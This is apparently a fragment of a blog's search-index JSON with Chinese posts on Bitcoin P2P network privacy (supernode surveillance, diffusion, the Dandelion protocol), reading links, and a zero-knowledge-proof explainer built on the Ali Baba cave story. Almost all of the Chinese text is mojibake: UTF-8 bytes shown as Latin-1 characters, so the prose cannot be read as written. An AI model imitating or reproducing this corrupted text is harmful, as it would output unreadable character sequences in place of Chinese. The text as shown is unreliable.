æ¯”ç‰¹å¸ç”±äºå…¶å‡åæ€§ï¼Œæä¾›äº†ä¸€äº›é‡‘èéšç§ã€‚å¦‚æœå…¨ä¸–ç•Œéƒ½çŸ¥é“è´¦æˆ·1G9HFbCRikgPpQboURsdqszy9HbKtvceZ5åœ¨ä¸€å®¶ç®€é™‹çš„æµ·å¤–è¯åº—èŠ±äº†0.25BTCï¼Œä¹Ÿè®¸æˆ‘å°±æ²¡äº‹ã€‚ä½†æ˜¯ï¼Œå¦‚æœæœ‰äººèƒ½æ‰¾å‡ºæœ€åˆå‘é€ç­¾åäº¤æ˜“çš„æˆ‘çš„IPï¼Œçªç„¶é—´æˆ‘çš„éšç§å°±è¢«æ³„éœ²äº†ã€‚ è¿™å¾ˆç³Ÿç³•ã€‚P2Pç½‘ç»œå¯¹å®¡æŸ¥åˆ¶åº¦æœ‰æŠµæŠ—åŠ›ï¼Œä½†å¯¹ç›‘è§†å´ä¸€ç‚¹ä¹Ÿä¸æŠµæŠ—ã€‚ è®©æˆ‘ä»¬å‹¾å‹’å‡ºä¸€ä¸ªå¤æ‚çš„çªƒå¬è€…å¦‚ä½•ç›‘è§†ç½‘ç»œçš„è¿‡ç¨‹ã€‚ é»˜è®¤æƒ…å†µä¸‹ï¼Œä¸€ä¸ªæ­£å¸¸çš„æ¯”ç‰¹å¸èŠ‚ç‚¹ä¼šä¸å…¶ä»–å¯¹ç­‰ä½“å»ºç«‹8ä¸ªå‡ºç«™è¿æ¥ã€‚ç„¶è€Œï¼Œæ¯”ç‰¹å¸å®¢æˆ·ç«¯æ˜¯å¼€æºçš„ï¼Œæ‰€ä»¥ä»»ä½•äººéƒ½å¯ä»¥è‡ªç”±åœ°ä¿®æ”¹ä»–ä»¬çš„å®¢æˆ·ç«¯ï¼Œä»¥è¿æ¥åˆ°ä»–ä»¬æƒ³è¦çš„æ›´å¤šå¯¹ç­‰ä½“ã€‚ç°åœ¨æ¯”ç‰¹å¸ç½‘ç»œä¸­å¤§çº¦æœ‰10,000ä¸ªå®æ—¶å¯¹ç­‰ä½“ï¼ŒåŸåˆ™ä¸Šï¼Œä¸€ä¸ªäººå¯ä»¥è¿æ¥åˆ°æ‰€æœ‰çš„å¯¹ç­‰ä½“ã€‚è¿™å°†ä½¿ä½ æˆä¸ºä¸€ä¸ªè¶…çº§èŠ‚ç‚¹ã€‚ æœ‰äº†è¶…çº§èŠ‚ç‚¹ï¼Œä½ å°±å¯ä»¥è·Ÿè¸ªç½‘ç»œä¸­ä»»ä½•åœ°æ–¹å‘é€çš„æ¯ä¸€æ¡ä¿¡æ¯ï¼Œå¹¶ä»ä¸Šå¸çš„è§†è§’é‡å»ºæ‰€æœ‰ä¿¡æ¯çš„å†å²ã€‚è¿™åŸºæœ¬ä¸Šå¯ä»¥è®©ä½ å¼„æ¸…æ¥šå“ªäº›åœ°å€å¯¹åº”å“ªäº›IPï¼Œå¹¶å¯¹æ¯”ç‰¹å¸äº¤æ˜“è¿›è¡ŒåŒ¿ååŒ–å¤„ç†ã€‚ gossipä¼ æ’­çš„è®¾è®¡ä¸æ˜¯ä¸ºäº†ç»´æŠ¤éšç§ã€‚è¯·è®°ä½ï¼Œåœ¨æ”¶åˆ°æ¶ˆæ¯åçš„é‚£ä¸€åˆ»ï¼Œæ¯ä¸ªèŠ‚ç‚¹éƒ½ä¼šç«‹å³å°†å…¶æ·¹æ²¡åˆ°æ‰€æœ‰çš„å‡ºç«™peerã€‚è¿™å°±ç•™ä¸‹äº†æ¯ä¸ªæ¶ˆæ¯å¼€å§‹çš„æ˜æ˜¾ç—•è¿¹ã€‚å³ä½¿ä¸€ä¸ªè¢«åŠ¨çš„è§‚å¯Ÿè€…åªè¿æ¥åˆ°ç½‘ç»œçš„50%ï¼Œä»–ä»¬ä¹Ÿä¼šæ¸…æ¥šåœ°çœ‹åˆ°ä»å‘ä»¶äººé‚£é‡Œå‘å‡ºçš„ â€œä¿¡æ¯æ³¢â€ã€‚ 2015å¹´ï¼Œæ¯”ç‰¹å¸æ”¹å˜äº†å®ƒä¼ æ’­gossipä¿¡æ¯çš„æ–¹å¼ï¼Œä»¥å®ç°æ›´å¥½çš„éšç§ã€‚å®ƒç°åœ¨ä½¿ç”¨ä¸€ç§å«åšæ‰©æ•£(diffusion)çš„æ–¹æ³•ã€‚åœ¨æ‰©æ•£è¿‡ç¨‹ä¸­ï¼Œå®¢æˆ·ç«¯ä¸æ˜¯ç«‹å³å‘æ¯ä¸ªå¯¹ç­‰ä½“æ³›æ»¥ï¼Œè€Œæ˜¯åœ¨å‘æ¯ä¸ªå¯¹ç­‰ä½“è¯´é—²è¯ä¹‹å‰ç­‰å¾…ä¸€ä¸ªéšæœºæŒ‡æ•°å»¶è¿Ÿã€‚è¿™æœ‰æ©ç›–P2Pæ¶ˆæ¯å›¾çš„ä½œç”¨ï¼Œä½¿äººä»¬æ›´éš¾è§‚å¯Ÿåˆ° â€œæ¶ˆæ¯æ³¢(message wave) â€œçš„æ¥æºã€‚ ä½ å¯ä»¥ç”¨è¿™æ ·çš„ä»£ç æ¥å‹¾å‹’å®ƒã€‚ def gossip(msg): for peer in peers: schedule_send(peer, msg, wait=np.random.exponential(1.0 / theta)) ç„¶è€Œï¼Œå³ä½¿å¦‚æ­¤ï¼Œæ¯”ç‰¹å¸ç½‘ç»œå±‚çš„éšç§ä¹Ÿè¿œéå®Œç¾ã€‚æ‰©æ•£(diffusion)ä»ç„¶å‘è¢«åŠ¨çš„å¯¹æ‰‹æ³„éœ²äº†ç›¸å½“å¤šçš„ä¿¡æ¯ã€‚æ­¤å¤–ï¼ŒP2Pä¿¡æ¯ä¸æ˜¯åŒè¾¹åŠ å¯†çš„ï¼Œæ‰€ä»¥è¢«åŠ¨çš„æ•°æ®åŒ…å—…æ¢å™¨å¯ä»¥å¾ˆå®¹æ˜“åœ°çª¥æ¢åˆ°ä»»ä½•æ¯”ç‰¹å¸æµé‡çš„æ˜æ–‡ã€‚ åœ¨æ”¹å–„æ¯”ç‰¹å¸çš„ç½‘ç»œçº§éšç§æ–¹é¢ï¼Œè¿˜æœ‰å¾ˆå¤šå·¥ä½œè¦åšã€‚ä¸€äº›æœ‰éšç§æ„è¯†çš„ç”¨æˆ·æ›´å–œæ¬¢æ¯”ç‰¹å¸è€Œä¸æ˜¯Torçš„ç½‘ç»œéšç§ï¼Œä½†å³ä½¿è¿™æ ·ä¹Ÿæœ‰é—®é¢˜ã€‚ æœ€è¿‘ï¼ŒCMUçš„ç ”ç©¶äººå‘˜æƒ³å‡ºäº†ä¸€ä¸ªæ¯”æ‰©æ•£(diffusion)æ›´å®Œå–„çš„æ–¹æ¡ˆï¼Œç§°ä¸ºè’²å…¬è‹±åè®®(Dandelion Protocol)ï¼Œæä¾›äº†æ›´å¥½çš„ç½‘ç»œçº§éšç§ä¿è¯ã€‚ åœ¨è’²å…¬è‹±åè®®ä¸­ï¼Œæ¯ä¸€ä¸ªäº¤æ˜“å¹¿æ’­éƒ½æ˜¯ä»ä¸€ä¸ªç§˜å¯†çš„ç”µè¯æ¸¸æˆå¼€å§‹çš„ã€‚å‘èµ·äººä¼šæŠŠä»–ä»¬çš„äº¤æ˜“æ‚„æ‚„å‘Šè¯‰ä¸€ä¸ªå¯¹ç­‰äººï¼Œåè€…å†æŠŠå®ƒæ‚„æ‚„å‘Šè¯‰å¦ä¸€ä¸ªå¯¹ç­‰äººï¼Œå¦‚æ­¤å¾ªç¯ã€‚ç»è¿‡éšæœºæ•°çš„è·³è½¬ï¼Œæœ€åä¸€ä¸ªå¯¹ç­‰ä½“å°†ä¼šåƒæ¯”ç‰¹å¸ä¸€æ ·æŠŠäº¤æ˜“è¯´å‡ºæ¥ã€‚ä½†è¿™ä¸ªå¯¹ç­‰ä½“ä¸å‘èµ·äººç›¸è·ç”šè¿œï¼Œå¯¹äºä»»ä½•è§‚å¯Ÿè€…æ¥è¯´ï¼Œéƒ½ä¸å¯èƒ½åˆ†è¾¨å‡ºè¿™æ¡é“¾æ˜¯ä»è°å¼€å§‹çš„ã€‚ è¿™å¯¹äºæ··æ·†å‘èµ·äººçš„IPæ›´ä¸ºæœ‰æ•ˆï¼Œä½†å®ƒçš„ä»£ä»·æ˜¯æ¶ˆæ¯çš„ä¼ æ’­é€Ÿåº¦æ›´æ…¢ã€‚è’²å…¬è‹±ç°åœ¨è¢«è®¤ä¸ºæ˜¯å¯¹æ¯”ç‰¹å¸gossipæœºåˆ¶çš„ä¸€ç§å¯èƒ½çš„å¢å¼ºï¼Œå¹¶ä¸”å·²ç»åœ¨å…¶ä»–åŠ å¯†è´§å¸ä¸­å®æ–½ã€‚æˆ‘ä»¬åœ¨è¡¥å……é˜…è¯»ä¸­æä¾›äº†æ›´å¤šå…³äºè’²å…¬è‹±çš„èµ„æºã€‚ ","date":"2022-08-23","objectID":"/p2p/:3:3","tags":["p2p","L0","Web3.0"],"title":"P2P","uri":"/p2p/"},{"categories":["Blockchain"],"content":"P2Pç½‘ç»œä¸­çš„ç”Ÿæ´» ä½ ç°åœ¨åº”è¯¥å¯¹ä¿¡æ¯åœ¨åŠ å¯†è´§å¸ç½‘ç»œä¸­çš„ä¼ æ’­æ–¹å¼æœ‰ä¸€ä¸ªæ›´å¥½çš„å¿ƒç†æ¨¡å‹ã€‚ç”±äºå…¶gossipæ¶æ„ï¼ŒåŠ å¯†è´§å¸æ˜¯ â€œæœ€ç»ˆä¸€è‡´â€â€“å®ƒä»¬ä¸æä¾›ä»»ä½•å…³äºä½ çš„æ¶ˆæ¯ä½•æ—¶ä¼šè¢«ç½‘ç»œçš„å…¶ä»–éƒ¨åˆ†çœ‹åˆ°çš„ç¡¬æ€§ä¿è¯ã€‚æ­¤å¤–ï¼Œå¹¶éæ‰€æœ‰èŠ‚ç‚¹éƒ½ä¼šåœ¨åŒä¸€æ—¶é—´çœ‹åˆ°ç›¸åŒçš„çŠ¶æ€ã€‚ ä¸‹å›¾: 50%ï¼ˆæ©™è‰²ï¼‰æˆ– 90%ï¼ˆè“è‰²ï¼‰çš„ç½‘ç»œéœ€è¦å¤šé•¿æ—¶é—´æ‰èƒ½æ”¶åˆ°æœ€æ–°çš„æ¯”ç‰¹å¸åŒºå— å½“è¿™äº›ç½‘ç»œè¾¾åˆ°ä¸€å®šè§„æ¨¡æ—¶ï¼Œä¿¡æ¯çš„ä¼ æ’­é€Ÿåº¦ä¼šç›¸å½“ç¼“æ…¢ã€‚å¯¹äºæ¯”ç‰¹å¸æ¥è¯´ï¼Œè¿‡å»90%çš„ç½‘ç»œéœ€è¦30å¤šç§’æ‰èƒ½æ”¶åˆ°æœ€æ–°çš„åŒºå—ï¼ç°åœ¨ï¼Œåªéœ€è¦å‡ ç§’é’Ÿå°±èƒ½è®©æ•´ä¸ªç½‘ç»œåŒæ­¥åˆ°æœ€æ–°çš„åŒºå—ã€‚ä»Šå¤©ï¼Œå®ƒéœ€è¦å‡ ç§’é’Ÿï¼Œç›´åˆ°æ•´ä¸ªç½‘ç»œåŒæ­¥åˆ°æœ€æ–°çš„åŒºå—ä¸Šã€‚(çŸ¿å·¥çœ‹åˆ°æ–°åŒºå—çš„é€Ÿåº¦è¦å¿«å¾—å¤šï¼Œè¿™ä¸€ç‚¹æˆ‘ä»¬å°†åœ¨åé¢æ¢è®¨æ¯”ç‰¹å¸é‡‡çŸ¿æ—¶è®¨è®ºï¼‰ã€‚ æˆ‘ä»¬å¯¹æ¯”ç‰¹å¸ç½‘ç»œå±‚çš„æ¢ç´¢åˆ°æ­¤ç»“æŸã€‚ç°åœ¨ä½ åº”è¯¥å¯¹æµè¨€åè®®çš„å·¥ä½œåŸç†æœ‰äº†ç›´è§‚çš„è®¤è¯†ï¼Œä»¥åŠæ˜¯ä»€ä¹ˆè®©å®ƒä»¬åœ¨è§„æ¨¡ä¸Šå¦‚æ­¤å¼ºå¤§ã€‚ä½ ä¹Ÿåº”è¯¥æ˜ç™½ä¸ºä»€ä¹ˆä¸­æœ¬èªé€‰æ‹©ç”¨P2Pæ¶æ„è®¾è®¡æ¯”ç‰¹å¸ç½‘ç»œã€‚ æœ‰äº†è¿™ä¸ªåŸºç¡€ï¼Œåœ¨ä¸‹ä¸€ä¸ªæ¨¡å—ä¸­ï¼Œæˆ‘ä»¬å°†æ¢ç´¢å…±è¯†â€“é¦–å…ˆï¼Œæˆ‘ä»¬å°†ç ”ç©¶å®ƒçš„ç»å…¸èµ·æºï¼Œå¯¼è‡´ä¸­æœ¬èªçš„åŸºæœ¬çªç ´ï¼Œä½¿æ¯”ç‰¹å¸æˆä¸ºå¯èƒ½ã€‚ ","date":"2022-08-23","objectID":"/p2p/:3:4","tags":["p2p","L0","Web3.0"],"title":"P2P","uri":"/p2p/"},{"categories":["Blockchain"],"content":"é™„åŠ é˜…è¯» https://docs.libp2p.io/introduction/ LIBP2Påº“ Bitcoin Core 0.11: P2P Network, a Bitcoin Wiki walkthrough of Bitcoin Coreâ€™s P2P networking stack (2018) Anonymity Properties of the Bitcoin P2P Network, showing how passive observers can use statistical techniques to deanonymize Bitcoin transactions by monitoring P2P traffic, by Giulia Fanti and Pramod Viswanath (2017) The Dandelion Protocol (video), a message propagation technique with stronger anonymity properties, presented by Giulia Fanti (2018) ","date":"2022-08-23","objectID":"/p2p/:3:5","tags":["p2p","L0","Web3.0"],"title":"P2P","uri":"/p2p/"},{"categories":["Blockchain"],"content":"å…³äºé›¶çŸ¥è¯†è¯æ˜çš„è‹¥å¹²çŸ¥è¯† ","date":"2022-08-22","objectID":"/%E9%9B%B6%E7%9F%A5%E8%AF%86%E8%AF%81%E6%98%8E/:0:0","tags":["ZKPs","L0","Web3.0"],"title":"é›¶çŸ¥è¯†è¯æ˜","uri":"/%E9%9B%B6%E7%9F%A5%E8%AF%86%E8%AF%81%E6%98%8E/"},{"categories":["Blockchain"],"content":"è¿™æ˜¯å•¥ æˆ‘çŸ¥é“ä¸€ä¸ªç§˜å¯†, ä¸èƒ½å‘Šè¯‰ä½ , ä½†æˆ‘åˆå¾—å‘ä½ è¯æ˜æˆ‘çš„ç¡®çŸ¥é“è¿™ä¸ªç§˜å¯† ","date":"2022-08-22","objectID":"/%E9%9B%B6%E7%9F%A5%E8%AF%86%E8%AF%81%E6%98%8E/:1:0","tags":["ZKPs","L0","Web3.0"],"title":"é›¶çŸ¥è¯†è¯æ˜","uri":"/%E9%9B%B6%E7%9F%A5%E8%AF%86%E8%AF%81%E6%98%8E/"},{"categories":["Blockchain"],"content":"ä¸ºä»€ä¹ˆéœ€è¦é›¶çŸ¥è¯†è¯æ˜ åŒºå—é“¾å¤ªé€æ˜ åŒºå—é“¾ä»¥é€æ˜è‘—ç§°, ä½†è¿™ä¼šå¸¦æ¥ä¸€äº›é—®é¢˜, æ¯”å¦‚ä¸€äº›ä¼ä¸šçº§åº”ç”¨ä¸­çš„æ•°æ®å¹¶ä¸é€‚åˆè¿™ç§é€æ˜æ€§ Web2.0å‘Web3.0çš„è¿‡åº¦ åœ¨Web3.0æ¦‚å¿µå¾ˆç«çˆ†çš„ä»Šå¤©, ä¸å¾—ä¸æ‰¿è®¤ä¸€ä¸ªè§‚ç‚¹: åœ¨å‘Web3.0è¿›å‘çš„è¿‡ç¨‹ä¸­, Web2.0çš„å·²æœ‰æ•°æ®å’Œç”Ÿæ€å°†é•¿æœŸè¿‡ç¨‹,ç„¶åèåˆ. ä¸€ä¸ªç®€å•çš„é—®é¢˜æ˜¯: Web2.0æ•°æ®å¦‚ä½•ä¼ é€’åˆ°Web3.0ä¸­, å¹¶åœ¨Web3.0çš„åŒºå—é“¾ä¸Šå½¢æˆå…±è¯†. é›¶çŸ¥è¯†è¯æ˜æä¾›äº†è§£å†³æ–¹æ¡ˆ, è®©Web2.0(ä»¥åŠä¸€åˆ‡é“¾å¤–æ•°æ®)å’ŒWeb3.0ç›¸äº’ä¿¡ä»» æ‰€ä»¥é›¶çŸ¥è¯†è¯æ˜æ˜¯Web3.0çš„åŸºçŸ³. å…¶å¤„äºL0å±‚. ","date":"2022-08-22","objectID":"/%E9%9B%B6%E7%9F%A5%E8%AF%86%E8%AF%81%E6%98%8E/:2:0","tags":["ZKPs","L0","Web3.0"],"title":"é›¶çŸ¥è¯†è¯æ˜","uri":"/%E9%9B%B6%E7%9F%A5%E8%AF%86%E8%AF%81%E6%98%8E/"},{"categories":["Blockchain"],"content":"é˜¿é‡Œå·´å·´æ´ç©´ å¦‚ä½•å‘ä½ çš„å­©å­è§£é‡Šé›¶çŸ¥è¯†è¯æ˜åè®® https://link.springer.com/content/pdf/10.1007/0-387-34805-0_60.pdf ç®€å•ç¿»è¯‘ä¸€ä¸‹: å“¦ï¼Œæˆ‘çš„å­©å­ä»¬ï¼Œä½ ä»¬è¦çŸ¥é“ï¼Œå¾ˆä¹…ä»¥å‰ï¼Œåœ¨ä¸œéƒ¨åŸå¸‚å·´æ ¼è¾¾ï¼Œä½ç€ä¸€ä¸ªå«é˜¿é‡Œå·´å·´çš„è€äººã€‚æ¯å¤©é˜¿é‡Œå·´å·´éƒ½ä¼šå»é›†å¸‚ä¸Šä¹°ä¸œè¥¿æˆ–å–ä¸œè¥¿ã€‚è¿™ä¸ªæ•…äº‹éƒ¨åˆ†æ˜¯å…³äºé˜¿é‡Œå·´å·´çš„ï¼Œéƒ¨åˆ†ä¹Ÿæ˜¯å…³äºä¸€ä¸ªå±±æ´çš„ï¼Œä¸€ä¸ªå¥‡æ€ªçš„å±±æ´ï¼Œå…¶ç§˜å¯†å’Œå¥‡è¿¹è‡³ä»Šå­˜åœ¨ã€‚ä½†æˆ‘æƒ³å¾—å¤ªè¿œäº†â€¦ æœ‰ä¸€å¤©ï¼Œåœ¨å·´æ ¼è¾¾é›†å¸‚ä¸Šï¼Œä¸€ä¸ªå°å·ä»é˜¿é‡Œå·´å·´æ‰‹ä¸­æŠ¢èµ°äº†ä¸€ä¸ªé’±åŒ…ï¼Œé˜¿é‡Œå·´å·´é©¬ä¸Šå¼€å§‹è¿½èµ¶ä»–ã€‚å°å·é€ƒè¿›äº†ä¸€ä¸ªå±±æ´ï¼Œå±±æ´çš„å…¥å£åˆ†å‰æˆä¸¤æ¡é»‘æš—çš„èœ¿èœ’é€šé“ï¼šä¸€æ¡å‘å·¦ï¼Œå¦ä¸€æ¡å‘å³ã€‚ å±±æ´å¤§æ¦‚é•¿è¿™ä¸ªæ ·å­ğŸ˜‚ xxxxxxx xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx xxxxxxx xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx xxxxxxx xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx xxxxxxx xxxxxxxxxxxxxxxxxxxxxxxxx xxxxxxx xxxxxxx xxxxxxxxxxxxxxxxxxxxxxxxx xxxxxxxxxxx xxxxxxx xxxxxxxxxxxxxxxxxxxxxxxxx xxxxxxxxxxx xxxxxxx xxxxxxxxxxxxxxxxxxxx xxxxxxxxxxx xxxxxxx xxxxxxxxxxxxxxxxxxxx xxxxxxxxxxx xxxxxxx xxxxxxxxxxxxxxxxxxxx xxxxxxxxxxx xxxxxxx left xxxxxxxxxxx xxxxxxx xxxxxxxxxxx xxxxxxx xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx xxxxxxx xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx xxxxxxx xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx xxxxxxx xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx xxxxxxx xxxxxxxxxxxxxxxxxxxxxxx xxxxxxx xxxxxxxxxxxxxxxxxxxxxxx xxxxxxx right xxxxxxx xxxxxxx xxxxxxx xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx é˜¿é‡Œå·´å·´æ²¡æœ‰çœ‹åˆ°å°å·è¿›å…¥å“ªæ¡é€šé“ã€‚é˜¿é‡Œå·´å·´ä¸å¾—ä¸é€‰æ‹©èµ°å“ªæ¡è·¯ï¼Œä»–å†³å®šå‘å·¦èµ°ã€‚å·¦è¾¹çš„é€šé“å°½å¤´æ˜¯ä¸€ä¸ªæ­»èƒ¡åŒã€‚é˜¿é‡Œå·´å·´ä»å²”è·¯å£ä¸€ç›´æ‰¾åˆ°æ­»èƒ¡åŒï¼Œä½†ä»–æ²¡æœ‰æ‰¾åˆ°å°å·ã€‚é˜¿é‡Œå·´å·´å¯¹è‡ªå·±è¯´ï¼Œå°å·ä¹Ÿè®¸åœ¨å¦ä¸€æ¡é€šé“ä¸Šã€‚äºæ˜¯ä»–æ‰¾äº†å³è¾¹çš„é€šé“ï¼Œä¹Ÿæ˜¯ä¸€ä¸ªæ­»èƒ¡åŒã€‚ä½†ä»–å†æ¬¡æ²¡æœ‰æ‰¾åˆ°å°å·ã€‚â€œè¿™ä¸ªæ´å¾ˆå¥‡æ€ªï¼Œâ€œé˜¿é‡Œå·´å·´å¯¹è‡ªå·±è¯´ï¼Œâ€œæˆ‘çš„å°å·å»å“ªå„¿äº†ï¼Ÿâ€ ç¬¬äºŒå¤©ï¼Œå¦ä¸€ä¸ªå°å·æŠ“èµ·é˜¿é‡Œå·´å·´çš„ç¯®å­ï¼Œåƒç¬¬ä¸€ä¸ªå°å·ä¸€æ ·ï¼Œé€ƒè¿›äº†é‚£ä¸ªå¥‡æ€ªçš„å±±æ´ã€‚é˜¿é‡Œå·´å·´è¿½èµ¶ä»–ï¼Œåˆä¸€æ¬¡æ²¡æœ‰çœ‹åˆ°å°å·å¾€å“ªè¾¹èµ°ã€‚è¿™ä¸€æ¬¡ï¼Œé˜¿é‡Œå·´å·´å†³å®šå‘å³æœç´¢ã€‚ä»–ä¸€ç›´èµ°åˆ°å³ä¾§é€šé“çš„å°½å¤´ï¼Œä½†æ²¡æœ‰æ‰¾åˆ°é‚£ä¸ªå°å·ã€‚ä»–å¯¹è‡ªå·±è¯´ï¼Œå’Œç¬¬ä¸€ä¸ªå°å·ä¸€æ ·ï¼Œç¬¬äºŒä¸ªå°å·ä¹Ÿå¾ˆå¹¸è¿ï¼Œèµ°äº†é˜¿é‡Œå·´å·´æ²¡æœ‰é€‰æ‹©çš„é€šé“ã€‚è¿™æ— ç–‘è®©å°å·å†æ¬¡ç¦»å¼€ï¼Œæ‚„æ‚„åœ°æ··å…¥æ‹¥æŒ¤çš„é›†å¸‚ã€‚ æ—¥å­ä¸€å¤©å¤©è¿‡å»ï¼Œæ¯å¤©éƒ½æœ‰å°å·ã€‚é˜¿é‡Œå·´å·´æ€»æ˜¯è¿½ç€å°å·è·‘ï¼Œä½†ä»–ä»æœªæŠ“ä½è¿‡ä»»ä½•ä¸€ä¸ªã€‚ç¬¬å››åå¤©ï¼Œç¬¬å››åä¸ªå°å·æŠ“èµ·é˜¿é‡Œå·´å·´çš„å¤´å·¾ï¼Œåƒä¹‹å‰çš„ä¸‰åä¹ä¸ªå°å·ä¸€æ ·ï¼Œé€ƒè¿›äº†é‚£ä¸ªå¥‡æ€ªçš„å±±æ´ã€‚é˜¿é‡Œå·´å·´åˆä¸€æ¬¡æ²¡æœ‰çœ‹åˆ°å°å·èµ°äº†å“ªæ¡è·¯ã€‚è¿™ä¸€æ¬¡ï¼Œé˜¿é‡Œå·´å·´å†³å®šæœç´¢å·¦è¾¹çš„é€šé“ï¼Œä½†ä»–åˆä¸€æ¬¡æ²¡æœ‰åœ¨é€šé“å°½å¤´æ‰¾åˆ°å°å·ã€‚é˜¿é‡Œå·´å·´éå¸¸ç–‘æƒ‘ã€‚ ä»–æœ¬å¯ä»¥åƒä»¥å‰é‚£æ ·å¯¹è‡ªå·±è¯´ï¼Œç¬¬å››ååå°å·å’Œå…¶ä»–ä¸‰åä¹åå°å·ä¸€æ ·å¹¸è¿ã€‚ä½†è¿™ç§è§£é‡Šéå¸¸ç‰µå¼ºï¼Œç”šè‡³é˜¿é‡Œ-å·´å·´ä¹Ÿä¸ç›¸ä¿¡ã€‚å››ååå°å·çš„è¿æ°”å®åœ¨å¤ªå¥½äº†ï¼Œä¸å¯èƒ½æ˜¯å¶ç„¶çš„äº‹æƒ…ã€‚ä¸€ç™¾ä¸‡åˆ†ä¹‹ä¸€çš„æœºä¼šï¼Œè¿™å››åä¸ªäººéƒ½èƒ½é€ƒè„±ï¼æ‰€ä»¥é˜¿é‡Œå·´å·´è¯´ï¼Œè¿™å››åä¸ªäººçš„è¿æ°”å¤ªå¥½äº†ï¼Œä¸å¯èƒ½æ˜¯å¶ç„¶çš„ã€‚æ‰€ä»¥é˜¿é‡Œå·´å·´å¯¹è‡ªå·±è¯´ï¼Œä¸€å®šæœ‰å¦ä¸€ç§æ›´å¯èƒ½çš„è§£é‡Šã€‚ä»–å¼€å§‹æ€€ç–‘ï¼Œè¿™ä¸ªå¥‡æ€ªçš„å±±æ´å®ˆæŠ¤ç€ä¸€ä¸ªç§˜å¯†! é˜¿é‡Œå·´å·´å¼€å§‹æ¢ç´¢è¿™ä¸ªå¥‡æ€ªå±±æ´çš„ç§˜å¯†ã€‚ä»–å†³å®šèº²åœ¨å³ä¾§é€šé“å°½å¤´çš„ä¸€äº›éº»è¢‹ä¸‹é¢ã€‚ç»è¿‡ä¸€æ®µéå¸¸ä¸èˆ’æœçš„ç­‰å¾…ï¼Œä»–çœ‹åˆ°ä¸€ä¸ªå°å·æ¥äº†ï¼Œä»–æ„Ÿè§‰åˆ°è‡ªå·±è¢«å—å®³è€…è¿½èµ¶ï¼Œå°±ä½å£°è¯´äº†ä¸€å¥ç¥å¥‡çš„è¯ï¼Œâ€œèŠéº»å¼€é—¨â€ã€‚é˜¿é‡Œå·´å·´æƒŠå¥‡åœ°çœ‹åˆ°æ´å£æ»‘å¼€ã€‚å°å·ä»æ´å£è·‘äº†å‡ºæ¥ã€‚ç„¶åï¼Œå¢™åˆæ»‘å¼€äº†ã€‚è¿½æ•è€…èµ¶åˆ°ï¼Œå‘ç°é€šé“çš„æ­»èƒ¡åŒé‡Œåªæœ‰é˜¿é‡Œå·´å·´åœ¨éº»è¢‹ä¸‹é¢ï¼Œä¸ç”±å¾—å¤§å¤±æ‰€æœ›ã€‚å°å·å·²ç»é€ƒèµ°äº†ã€‚ä½†é˜¿é‡Œå·´å·´å¾ˆé«˜å…´ï¼Œå› ä¸ºä»–å‘ç°äº†å¥‡å¼‚æ´ç©´çš„ç§˜å¯†ã€‚ é˜¿é‡Œå·´å·´ç”¨è¿™äº›ç¥å¥‡çš„è¯è¯­è¿›è¡Œäº†å®éªŒã€‚ä»–æƒŠå¥‡åœ°å‘ç°ï¼Œå½“å¢™å£æ»‘å¼€æ—¶ï¼Œå³è¾¹çš„é€šé“ä¸å·¦è¾¹çš„é€šé“æ˜¯ç›¸è¿çš„ã€‚ç°åœ¨ï¼Œé˜¿é‡Œå·´å·´çŸ¥é“äº†å››åä¸ªå°å·æ˜¯å¦‚ä½•ä»ä»–æ‰‹ä¸­é€ƒè„±çš„äº†ã€‚é˜¿é‡Œå·´å·´ç”¨è¿™äº›é­”æ³•è¯ä¸æ–­å·¥ä½œï¼Œæœ€åä»–è®¾æ³•ç”¨æ–°çš„é­”æ³•è¯å–ä»£å®ƒä»¬ï¼Œæœ‰ç‚¹åƒä½ æ”¹å˜ä¸€äº›æŒ‚é”çš„å¯†ç ã€‚é˜¿é‡Œå·´å·´æŠŠè¿™ä¸ªæ•…äº‹å’Œä»–çš„å‘ç°è®°å½•åœ¨ä¸€æœ¬å¯çˆ±çš„æ’å›¾æ‰‹ç¨¿ä¸­ã€‚ä»–æ²¡æœ‰å†™ä¸‹æ–°çš„é­”æ³•è¯ï¼Œä½†ä»–åŒ…æ‹¬äº†ä¸€äº›å…³äºå®ƒä»¬çš„å¾®å¦™çº¿ç´¢ã€‚ é˜¿é‡Œå·´å·´çš„æ‰‹ç¨¿åœ¨ä¸­ä¸–çºªæ—¶æŠµè¾¾æ„å¤§åˆ©ã€‚ä»Šå¤©å®ƒåœ¨ç¾å›½ï¼Œé è¿‘æ³¢å£«é¡¿ã€‚åœ¨é‚£é‡Œï¼Œå®ƒæœ€è¿‘å¼•èµ·äº†ä¸€äº›å¥½å¥‡çš„ç ”ç©¶äººå‘˜çš„å……åˆ†æ³¨æ„ã€‚é€šè¿‡å¯¹å¾®å¦™çº¿ç´¢çš„è§£å¯†ï¼Œè¿™äº›ç ”ç©¶äººå‘˜ç”šè‡³æ‰¾å›äº†æ–°çš„é­”åŠ›ä¹‹è¯ã€‚ ç”µè§†ç½‘ç»œå¾ˆå¿«å°±çŸ¥é“äº†åœ¨å·´æ ¼è¾¾å‘ç”Ÿçš„å¼‚å¸¸äº‹ä»¶ã€‚ä¸€å®¶å¤§å‹ç¾å›½ç”µè§†ç½‘ç”šè‡³è·å¾—äº†è¿™ä¸ªæ•…äº‹çš„ç‹¬å®¶æŠ¥é“ã€‚å…¶ä¸­ä¸€ä½ç ”ç©¶äººå‘˜ï¼ŒæŸä¸ªå«ç±³å…‹-é˜¿é‡Œçš„äººï¼Œä¹Ÿè®¸æ˜¯é˜¿é‡Œå·´å·´çš„åè£”ï¼Œæƒ³è¯æ˜ä»–çŸ¥é“è¿™ä¸ªç§˜å¯†ã€‚ä½†ä»–å¹¶ä¸æƒ³é€éœ²è¿™ä¸ªç§˜å¯†ã€‚ä»–çš„åšæ³•æ˜¯è¿™æ ·çš„ã€‚ 